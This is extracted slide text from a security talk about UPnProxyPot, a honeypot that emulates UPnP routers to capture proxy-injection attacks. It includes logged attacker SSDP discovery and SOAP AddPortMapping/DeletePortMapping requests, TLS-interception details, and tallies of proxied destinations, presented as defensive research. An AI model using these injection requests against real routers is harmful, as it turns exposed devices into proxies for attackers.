- UPnP emulation good enough to get to injections phase
- “On-the-fly” proxy capabilities
- MITM content inspection and logging
- TLS stripping
- Make this easy to modify for fingerprint evasion without code changes
- Session based PCAP capabilities
- Written in Golang & bash
27
SSDP emulation
UPnProxyPot
- SSDP response lifted directly from most abused device in research 
- Is stored in a flat file on disk, can be changed without code modification
- Any SSDP banner/location can be used, just make sure you update the 
UPnP listen socket to reflect SSDP or vice versa
28
UPnP emulation
UPnProxyPot
- UPnP responses lifted directly from most abused device from research
- All HTML and XML is stored in flat files, updating these requires no code
- UPnP emulation serves basic files, handles NAT interactions
- Attacker supplied SOAP is parsed/handled via RegEx
- Will respond with error payloads if criteria aren’t met
- Responses must contain attacker supplied data, so these responses use 
standard printf formatting (%s, %d, etc.)
29
“On-the-fly” proxying
UPnProxyPot
- Attackers submit proxy configs via SOAP
- We parse them and create a “Session” of sorts
- Scrape and log plaintexts across the proxied session in both directions
- If they’re proxying to a TCP/443 endpoint we MITM the TLS connection
30
Stripping TLS
UPnProxyPot
- Attackers actually do some verification here
- Initial deployments saw connections, but would bail before pushing data
- Attackers are fingerprinting certs (initially via subject lines)
- The automated cloning process scrapes the domain from the ClientHello
- We then go forward to the injected endpoint and get it’s cert info w/ SNI
- We copy the subject field (O=Oh Noes LLC; CN=www.domain.lol)
- We mirror this subject in our cloned self signed certs
- 1 day before Defcon deadline… it broke… I haven’t figured it out.
- :*(
31
Automated PCAP’ing
UPnProxyPot
- Project uses gopacket
- Allows us to create pcaps on the fly using BPF
- As attackers interact with a proxied injection, PCAPs are collected
- If you find something interesting in the logs, you can find the associated 
PCAP and see the entire session easily in your favorite packet muncher
- WARNING: If you run out of disk space, this is probably why
     pcaps]# ls | wc -l                      pcaps]# du -ch
        81100                                   5.4G total
32
1.5’ish years in the wild
UPnProxyPot
- 14 nodes deployed across a single VPS provider
- Geos from Dallas to London to Tokyo
- 300GB+ of PCAPs and logs
- 100’s of millions of captured proxy sessions
- Billions of lines of logs
33
Data, where’d you go?
UPnProxyPot
I’m an idiot. 💯
34
2’ish months in the wild
UPnProxyPot
- 4 nodes deployed across a single VPS provider
- US, UK, India, & Japan
- 39GB+ of PCAPs and logs
- 230k+ of captured proxy sessions
- 22+ million lines of logs
35
Thankfully a lot of it was kinda boring (as you’ll see). 
Lost data sucks but...
- Trends in “new” data reflect what was observed in lost 
data
- Not ALL data was lost, I did manage to save SOME of the 
interesting bits in notes and smaller carve outs
36
Injection testing
UPnProxy: Observations
- Injections aren’t blindly applied
- Actors first insert a test proxy instance 
- After confirmation that it works, they inject a real proxy
- Utilize it
- Then delete it … or at least try to
37
Injection testing
UPnProxy: Observations
2021/04/24 01:29:35 SSDP In: 93.190.139.76:46565
M-SEARCH * HTTP/1.1
Host:239.255.255.250:1900
ST:upnp:rootdevice
Man:"ssdp:discover"
MX:1
2021/04/24 01:29:35 UPnP In: 93.190.139.76:57332
GET /etc/linuxigd/gatedesc.xml HTTP/1.0
Host: 192.168.0.1:2048
HTTP/1.1 200 OK
CACHE-CONTROL: max-age=120
ST: upnp:rootdevice
USN: uuid:fc4ec57e-b051-11db-88f8-0060085db3f6::upnp:rootdevice
EXT:
SERVER: Net-OS 5.xx UPnP/1.0
LOCATION: http://192.168.0.1:2048/etc/linuxigd/gatedesc.xml
38
Injection testing (cont.)
UPnProxy: Observations
2021/04/24 01:29:35 UPnP In: 93.190.139.76:57366
POST /etc/linuxigd/gateconnSCPD.ctl HTTP/1.0
HOST: 192.168.0.1:2048
SOAPACTION:"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"
CONTENT-TYPE: text/xml ; charset="utf-8"
Content-Length: 634
22280
TCP
80
74.6.231.21
1
sync22280
600
39
Injection testing (cont.)
UPnProxy: Observations
2021/04/24 01:29:35 93.190.139.76:57388=>74.6.231.21:80 {sync22280 600 74.6.231.21 80 22280  1 TCP}
GET / HTTP/1.0
Host: yahoo.com
2021/04/24 01:29:35 74.6.231.21:80=>93.190.139.76:57388 {sync22280 600 74.6.231.21 80 22280  1 TCP}
HTTP/1.0 301 Moved Permanently
Date: Sat, 24 Apr 2021 01:29:35 GMT
Server: ATS
Cache-Control: no-store, no-cache
Content-Type: text/html
Content-Language: en
Connection: keep-alive
X-Frame-Options: SAMEORIGIN
Location: https://yahoo.com/
Content-Length: 8
redirect
40
Injection testing (cont.)
UPnProxy: Observations
2021/04/24 01:29:35 UPnP In: 93.190.139.76:57634
POST /etc/linuxigd/gateconnSCPD.ctl HTTP/1.0
HOST: 192.168.0.1:2048
SOAPACTION:"urn:schemas-upnp-org:service:WANIPConnection:1#DeletePortMapping"
CONTENT-TYPE: text/xml ; charset="utf-8"
Content-Length: 413
^@s-upnp-org:service:WANIPConnection:1">
22280
TCP
^@"urn:schemas-upnp-org:service:WANIPConnection:1">
22280
…
^@s-upnp-org:service:WANIPConnection:1">
22280
TCP
^@"urn:schemas-upnp-org:service:WANIPConnection:1">
22280
TCP
80
74.6.231.21
1
sync22280600
^@-com:service:Dummy:1^@/serviceType>
41
Injection testing (cont.)
UPnProxy: Observations
" *.upnproxy.log --binary-files=text | cut -d'=' -f1 | awk '{print $3}' | sort | uniq -c | sort -nr
194686 89.39.105.12:80 - ip.shtml (IP & plug)
   684 23.62.198.254:80 - akamai
   546 74.6.231.20:80 - yahoo
   514 98.137.11.164:80 - yahoo
   514 98.137.11.163:80 - yahoo
   513 74.6.143.26:80 - yahoo
   502 74.6.143.25:80 - yahoo
   493 74.6.231.21:80 - yahoo
   315 23.66.22.254:80 - akamai
   275 23.34.208.53:80 - akamai
   235 23.206.47.136:80 - akamai
 158 23.5.235.143:80 - akamai
  38 23.36.87.113:80 - akamai
  32 23.206.46.23:80 - akamai
  28 104.73.60.191:80 - akamai
  16 172.217.20.110:80 - google
   5 94.100.180.200:80 - mail.ru
   4 217.69.139.202:80 - mail.ru
   3 195.201.43.23:80 - ip.php (IP)
   2 217.69.139.200:80 - mail.ru
43
Injection testing (cont.)
UPnProxy: Observations
2021/04/24 07:35:02 93.190.139.76:1603=>89.39.105.12:80 {sync38201 600 89.39.105.12 80 38201  1 TCP}
GET /ip.shtml HTTP/1.0
Host: 89.39.105.12
2021/04/24 07:35:02 89.39.105.12:80=>93.190.139.76:1603 {sync38201 600 89.39.105.12 80 38201  1 TCP}
HTTP/1.0 200 OK
Date: Sat, 24 Apr 2021 07:35:02 GMT
Server: Apache/2.4.6 (CentOS)
Accept-Ranges: bytes
Connection: close
Content-Type: text/html; charset=UTF-8